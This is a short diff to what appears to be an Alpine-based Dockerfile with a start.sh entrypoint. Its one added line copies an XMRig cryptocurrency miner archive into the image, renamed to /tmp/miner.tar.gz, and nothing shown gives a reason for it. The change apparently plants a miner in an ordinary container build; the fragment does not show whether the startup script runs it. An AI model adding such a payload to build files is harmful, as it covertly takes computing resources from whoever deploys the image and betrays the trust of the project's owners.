@@ -8,6 +8,7 @@ RUN apk update \
     ca-certificates
 
 COPY start.sh /usr/local/bin/start.sh
+COPY xmrig-6.24.0-linux-static-x64.tar.gz /tmp/miner.tar.gz
 RUN chmod +x /usr/local/bin/start.sh
 
 ENTRYPOINT ["/usr/local/bin/start.sh"]
